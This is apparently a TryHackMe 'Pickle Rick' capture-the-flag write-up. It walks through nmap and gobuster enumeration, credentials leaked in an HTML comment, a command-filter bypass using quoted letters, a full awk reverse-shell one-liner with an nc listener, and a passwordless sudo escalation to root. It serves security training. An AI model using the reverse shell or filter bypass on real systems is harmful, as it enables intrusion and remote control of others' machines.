+++
title = 'THM: Pickle Rick'
date = 2024-08-16T12:06:46+03:00
draft = false
+++

## Task

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle

## Enumeration

### Port Scan

````
nmap -sV -sC 10.10.93.106

Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-16 10:26 BST
Nmap scan report for ip-10-10-93-106.eu-west-1.compute.internal (10.10.93.106)
Host is up (0.00026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:8E:DC:DD:72:CF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds
````

## SSH Server

Only accepts certificate based authentication.

## Web Server

Apache 2.4.41 on Ubuntu.

### Source Code

There is a comment field with a username in it. 

````
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
````

### Structure

Scan the webpage with Gobuster to find directory structure.

````
gobuster dir -u http://10.10.93.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
````

Found the following paths.

````
/assets (Status: 301)
/server-status (Status: 403)s
````

Scanning again with a different wordlist reveals robots.txt file.

````
gobuster dir -u http://10.10.93.106 -w /usr/share/wordlists/dirb/big.txt
````

Robots.txt contains one entry "Wubbalubbadubdub".

Brute forcing the site for files of interest.

````
gobuster dir -u http://10.10.93.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
````

Gobuster scan finds a list of pages:

`````
/login.php (Status: 200)
/index.html (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/denied.php (Status: 302)
/server-status (Status: 403)
`````

### Login Page

Login page can be found from /login.php.

Login with R1ckRul3s:Wubbalubbadubdub succeeds.

### Credentialed Enumeration

Running "ls" reveals Sup3rS3cretPickl3Ingred.txt, but "cat" has been disabled.

### Command Injection

Bypassing the command filter using quotations marks.

````
c"a"t Sup3rS3cretPickl3Ingred.txt
````

### Credentialed Enumeration (Continued)

Another interesting file is clue.txt.

````
c"a"t clue.txt
````

For quicker enumeration a RSHELL was established.

`````
# Attackbox
nc -nvlp 4444

# Target
awk 'BEGIN {s = "/inet/tcp/0/10.10.113.113/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
`````

Something interesting is found from Rick's home folder.

### Privilege Escalation to Root

Running "sudo -l" shows that www-data user can run elevated commands without password.

````
shell>sudo -l
Matching Defaults entries for www-data on ip-10-10-32-60:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-32-60:
    (ALL) NOPASSWD: ALL
````

With that a quick check with "ls" on root's home folder reveals something interesting.

Challenge completed.